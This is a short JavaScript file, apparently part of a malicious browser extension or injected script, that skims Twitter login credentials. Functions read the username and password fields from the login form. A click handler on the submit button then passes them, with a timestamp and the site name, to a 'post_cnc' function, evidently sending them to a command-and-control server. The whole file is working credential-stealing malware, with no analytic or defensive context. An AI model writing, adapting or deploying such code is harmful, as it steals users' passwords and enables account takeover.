function get_user(){
	try {
		return document.getElementsByClassName('js-username-field email-input js-initial-focus')[0].value;
	} catch(error){
		console.log(error);
		return false;
	}
}

function get_pass(){
	try {
		return document.getElementsByClassName('js-password-field')[0].value;
	} catch(error){
		console.log(error);
		return false;
	}
}

function get_user_pass(){
	try {
		let data = {
			"auth": {
				timestamp: Date.now(),
				user: get_user(),
				pass: get_pass(),
				site: "twitter.com"
			}
		};
		return data;
	} catch(error){
		console.log(error);
		return false;
	}
}

document.getElementsByClassName('submit EdgeButton EdgeButton--primary EdgeButtom--medium')[0].addEventListener(
	'click',
	function(){
		try {
			post_cnc(
				get_user_pass(),
				function(data){
					console.log(data);
					return true;
				}
			);
			return true;
		} catch(error){
			console.log(error);
			return false;
		}
	}
);